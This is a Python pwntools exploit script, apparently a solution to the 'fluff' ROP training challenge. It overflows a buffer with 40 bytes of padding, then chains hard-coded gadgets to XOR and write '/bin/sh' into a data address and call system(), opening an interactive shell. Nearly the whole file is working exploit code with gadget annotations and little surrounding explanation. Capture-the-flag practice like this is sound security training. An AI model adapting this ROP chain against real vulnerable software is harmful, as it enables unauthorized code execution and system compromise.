from pwn import *
# import angr, angrop

prog = process("./fluff")
# p = angr.Project("fluff")

# rop = p.analyses.ROP()
# rop.find_gadgets()

data_addr = p64(0x00601050)
system_call = p64(0x00400810)
pop_rdi = p64(0x004008c3)

# 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
xor_r11_r11_pop_r14 = p64(0x00400822) # clears r11

# 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
xchg_r11_r10_pop_r15_mov_r11 = p64(0x00400840)

# 0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;
xor_r11_r12_pop_r12_mov_r13 = p64(0x0040082f)

# 0x004008bc               415c  pop r12
# 0x004008be               415d  pop r13
# 0x004008c0               415e  pop r14
# 0x004008c2               415f  pop r15
# 0x004008c4                 c3  ret
pop_r12_r13_r14_r15 = p64(0x004008bc)

# 0x0040084e             4d891a  mov qword [r10], r11
# 0x00400851               415d  pop r13
# 0x00400853               415c  pop r12
# 0x00400855             453022  xor byte [r10], r12b
# 0x00400858                 c3  ret
mov_r11_r10_pop_r13_pop_r12_xor_r10_r12 = p64(0x0040084e)

# 0x0040084f               891a  mov dword [rdx], ebx
# 0x00400851               415d  pop r13
# 0x00400853               415c  pop r12
# 0x00400855             453022  xor byte [r10], r12b
# 0x00400858                 c3  ret
mov_pop_xor1 = p64(0x0040084f)

payload = b'a' * 40 

payload += xor_r11_r11_pop_r14 # clear r11
payload += p64(0x11) # junk for the r14 pop

payload += pop_r12_r13_r14_r15
payload += data_addr # pop into r12 in order to get xor'd into r11
payload += p64(0x11) # junk for the r13 pop
payload += p64(0x11) # junk for the r14 pop
payload += p64(0x11) # junk for the r15 pop

payload += xor_r11_r12_pop_r12_mov_r13 # xor r12 (which holds our data addr) into r11
payload += p64(0x11) # junk for the r12 pop

payload += xchg_r11_r10_pop_r15_mov_r11 # exchange our data addr from r11 into r10
payload += p64(0x11) # junk for the r15 pop

payload += xor_r11_r11_pop_r14 # clear r11
payload += p64(0x11) # junk for the r14 pop

payload += pop_r12_r13_r14_r15 # pop our string into r12 in order to get xor'd into r11
str = (chr(0x2f ^ 0x11) + "bin/sh\0")

payload += bytes(str, 'utf-8')
payload += p64(0x11) # junk for the r13 pop
payload += p64(0x11) # junk for the r14 pop
payload += p64(0x11) # junk for the r15 pop

payload += xor_r11_r12_pop_r12_mov_r13 # xor r12 (which holds our string) into r11
payload += p64(0x11) # the byte we'll want to xor against the first byte of our string

payload += mov_r11_r10_pop_r13_pop_r12_xor_r10_r12 # mov our string from r11 into area of memory pointed to by r10
payload += p64(0x11) # junk for the r13 pop
payload += p64(0x11) # junk for the r12 pop

# Put our data address into rdi and jump to system call
payload += pop_rdi
payload += data_addr
payload += system_call

#open('payload', 'w').write(payload)
#log.info("PAYLOAD :" + payload)

print (prog.recvuntil(">"))
prog.clean()

prog.sendline(payload)

prog.interactive()
